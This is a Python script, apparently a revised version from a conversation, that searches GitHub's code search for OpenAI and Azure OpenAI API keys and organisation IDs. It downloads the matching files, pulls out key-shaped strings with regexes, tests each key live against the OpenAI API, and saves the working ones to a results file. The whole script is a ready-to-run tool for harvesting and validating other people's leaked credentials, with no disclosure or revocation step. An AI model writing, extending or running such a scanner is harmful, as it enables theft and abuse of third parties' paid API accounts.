import requests
import re
import os
import time
from openai import OpenAI

# === Enhanced Configuration ===
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
OPENAI_TEST_ENABLED = True
OUTPUT_FILE = 'openai_keys_results.txt'

# Expanded search patterns
SEARCH_PATTERNS = [
    'sk-[a-zA-Z0-9]{20,60}',  # More flexible length
    'OPENAI_API_KEY',
    'OPENAI_API_KEY=',
    'openai_api_key',
    'openai.api.key',
    'openai-key',
    'openai_key',
    'sk-proj-',  # New OpenAI format
    'OPENAI_ORG_ID',
    'OPENAI_API_BASE',
    'OPENAI_API_TYPE',
    'AZURE_OPENAI_API_KEY',
    'AZURE_OPENAI_ENDPOINT'
]

def search_github_for_openai_keys():
    """
    Enhanced GitHub search with pagination and better patterns
    """
    potential_keys = []
    headers = {'Authorization': f'token {GITHUB_TOKEN}'} if GITHUB_TOKEN else {}
    
    all_items = []
    
    # Search for each pattern
    for pattern in SEARCH_PATTERNS:
        print(f"🔍 Searching for: {pattern}")
        page = 1
        per_page = 100
        
        while page <= 10:  # Limit to 10 pages (1000 results per pattern)
            url = 'https://api.github.com/search/code'
            params = {
                'q': f'"{pattern}"',
                'per_page': per_page,
                'page': page
            }
            
            try:
                response = requests.get(url, headers=headers, params=params)
                
                if response.status_code == 403:
                    print("⚠ Rate limited, waiting 60 seconds...")
                    time.sleep(60)
                    continue
                
                response.raise_for_status()
                data = response.json()
                
                items = data.get('items', [])
                if not items:
                    break  # No more results
                
                all_items.extend(items)
                print(f"📄 Found {len(items)} files for pattern '{pattern}' (page {page})")
                
                # Process each file
                for item in items:
                    process_github_item(item, potential_keys)
                
                page += 1
                time.sleep(1)  # Be nice to GitHub
                
            except requests.exceptions.RequestException as e:
                print(f"❌ Error searching for {pattern}: {e}")
                break
    
    return list(set(potential_keys))

def process_github_item(item, potential_keys):
    """
    Process a single GitHub search result item
    """
    repo_name = item['repository']['full_name']
    file_path = item['path']
    default_branch = item['repository'].get('default_branch', 'main')
    
    print(f"📂 Checking: {repo_name}/{file_path}")
    
    # Try multiple branch names
    branches_to_try = [default_branch, 'main', 'master', 'develop']
    
    for branch in branches_to_try:
        raw_url = f"https://raw.githubusercontent.com/{repo_name}/{branch}/{file_path}"
        
        try:
            raw_response = requests.get(raw_url, timeout=10)
            if raw_response.status_code == 200:
                extract_keys_from_content(raw_response.text, potential_keys)
                break  # Found the file, no need to try other branches
            elif raw_response.status_code == 404:
                continue  # Try next branch
            else:
                print(f"⚠ HTTP {raw_response.status_code} for {raw_url}")
                break
        except Exception as e:
            print(f"⚠ Error fetching {raw_url}: {e}")
            break
    
    time.sleep(0.5)  # Shorter delay between files

def extract_keys_from_content(content, potential_keys):
    """
    Extract potential API keys from file content with improved patterns
    """
    # Enhanced key patterns
    key_patterns = [
        r'sk-[a-zA-Z0-9]{20,60}',  # OpenAI key format (more flexible)
        r'sk-proj-[a-zA-Z0-9]{20,60}',  # New OpenAI project keys
        r'OPENAI_API_KEY[\'\"\s:=]+([a-zA-Z0-9\-_]{20,60})',
        r'openai_api_key[\'\"\s:=]+([a-zA-Z0-9\-_]{20,60})',
        r'api_key[\'\"\s:=]+(sk-[a-zA-Z0-9]{20,60})',
        r'openai[-_]key[\'\"\s:=]+([a-zA-Z0-9\-_]{20,60})',
        r'OPENAI_ORG_ID[\'\"\s:=]+([a-zA-Z0-9\-_]{20,60})',
        r'org-[a-zA-Z0-9]{20,60}',  # OpenAI organization IDs
    ]
    
    for pattern in key_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                key = match[0] if match else match
            else:
                key = match
            
            # Clean and validate the key
            cleaned_key = clean_and_validate_key(key)
            if cleaned_key and cleaned_key not in potential_keys:
                potential_keys.append(cleaned_key)
                print(f"🎯 Found potential key: {cleaned_key[:20]}...")

def clean_and_validate_key(key):
    """
    Clean and validate extracted keys
    """
    if not key:
        return None
    
    # Remove surrounding quotes and whitespace
    key = key.strip('"\'').strip()
    
    # If it's a key-value pair, extract just the value
    if '=' in key:
        key = key.split('=')[-1].strip()
    
    # Validate OpenAI key format
    if key.startswith('sk-') and 20 <= len(key) <= 60:
        return key
    elif key.startswith('sk-proj-') and 20 <= len(key) <= 60:
        return key
    elif key.startswith('org-') and 20 <= len(key) <= 60:
        return key
    
    return None

# Keep the rest of your functions the same (test_openai_key, save_results, main)
def test_openai_key(api_key):
    """
    Test if an OpenAI API key is valid
    """
    try:
        client = OpenAI(api_key=api_key)
        models = client.models.list()
        print(f"✅ Key valid: {api_key[:15]}...")
        return True
    except Exception as e:
        error_msg = str(e)
        if 'rate limit' in error_msg.lower():
            print(f"⚠️ Key rate limited: {api_key[:15]}...")
            return 'rate_limited'
        elif 'insufficient_quota' in error_msg:
            print(f"⚠️ Key quota exceeded: {api_key[:15]}...")
            return 'quota_exceeded'
        elif 'invalid_api_key' in error_msg:
            print(f"❌ Key invalid: {api_key[:15]}...")
            return False
        else:
            print(f"❌ Key error: {api_key[:15]}... - {error_msg[:50]}")
            return False

def save_results(valid_keys, all_keys, filename=OUTPUT_FILE):
    """
    Save the results to a text file
    """
    with open(filename, 'w') as f:
        f.write("=== Enhanced OpenAI API Key Scanner Results ===\n")
        f.write(f"Scan completed: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total potential keys found: {len(all_keys)}\n")
        f.write(f"Valid working keys: {len(valid_keys)}\n\n")
        
        f.write("VALID KEYS:\n")
        f.write("=" * 50 + "\n")
        for key in valid_keys:
            f.write(f"{key}\n")
        
        f.write("\n\nALL POTENTIAL KEYS FOUND:\n")
        f.write("=" * 50 + "\n")
        for key in all_keys:
            f.write(f"{key}\n")
    
    print(f"\n💾 Results saved to: {filename}")

def main():
    print("🚀 Enhanced GitHub OpenAI API Key Scanner")
    print("=" * 50)
    
    if not GITHUB_TOKEN:
        print("⚠️ Warning: No GITHUB_TOKEN environment variable set.")
        print("You will be rate limited to 10 requests/minute without a token.")
        print("Get one from: https://github.com/settings/tokens")
        print("")
        # You might want to exit here or implement a simpler search
        return
    
    # Step 1: Search GitHub for potential keys
    print("🔍 Searching GitHub for potential OpenAI API keys...")
    potential_keys = search_github_for_openai_keys()
    
    print(f"🎯 Found {len(potential_keys)} potential API keys")
    
    # Step 2: Test each key for validity
    valid_keys = []
    
    if OPENAI_TEST_ENABLED and potential_keys:
        print("\n🧪 Testing API key validity...")
        for i, key in enumerate(potential_keys, 1):
            print(f"Testing key {i}/{len(potential_keys)}...")
            
            result = test_openai_key(key)
            if result is True:
                valid_keys.append(key)
            
            time.sleep(1)  # Be nice to OpenAI's API
    else:
        print("\n⚠️ Skipping API key validation")
        valid_keys = []
    
    # Step 3: Save results
    print(f"\n💾 Saving results...")
    print(f"✅ Valid keys found: {len(valid_keys)}")
    save_results(valid_keys, potential_keys)
    
    print("\n🎉 Scan completed!")

if __name__ == "__main__":
    main()